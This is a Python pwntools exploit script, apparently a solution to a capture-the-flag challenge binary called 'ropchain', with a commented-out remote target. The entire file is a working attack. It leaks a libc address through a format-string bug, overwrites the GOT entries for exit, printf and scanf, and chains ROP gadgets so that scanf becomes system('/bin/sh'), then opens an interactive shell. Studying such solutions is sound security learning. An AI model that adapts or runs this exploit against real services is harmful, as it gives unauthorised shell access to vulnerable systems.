from pwn import *

e = ELF('./ropchain')
# libc = ELF('./libc6_2.31-0ubuntu9.1_amd64.so') # remote libc
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')


p = process('./ropchain')

# p = remote('45.122.249.68',10016)

offset = 6
payload = b''
payload = b'%12$n%71$llx' # leak libc lib_start_main_ret
print(payload)

payload += b'%4766c%21$hn%24699c%12$llnaa' # overwrite 2 first bytes of exit to ropchain pop_6 (offset 21), overwrite printf to format string %s
payload += p64(0x00000000004012b3)  # pop rdi ret
payload += p64(e.got['printf'])  # offset format string overwrite scanf and contain overwrite value format string for scanf '%s'
payload += p64(0x00000000004012b1) # pop rsi ; pop r15 ; ret
payload += p64(e.got['__isoc99_scanf']) # address to scanf to save system address
payload += b'A'*8 # padding for pop r15
payload += p64(e.plt['__isoc99_scanf']) # call scanf('%s',got.scanf)
payload += p64(0x00000000004012b3)  #pop rdi ret 
payload += p64(e.got['exit']) # got.exit = got.scanf + 4 so got.exit is saving '/bin/sh' after scanf
payload += p64(0x000000000040101a) # ret algin stack
payload += p64(e.plt['__isoc99_scanf']) # call scanf now overwrited by system and rdi = '/bin/sh'

# offset format string overwrite exit
payload += p64(e.got['exit'])


print(payload)
# raw_input('DEBUG')

p.sendline(payload)

addr = int(p.recv().strip()[:30].decode(), 16) # recv leak libc address

libc.address = addr - 234 - libc.symbols['__libc_start_main']
print(hex(addr-234-9))

p.sendline(p64(libc.symbols['system'])+b'/bin/sh\x00')

p.interactive()
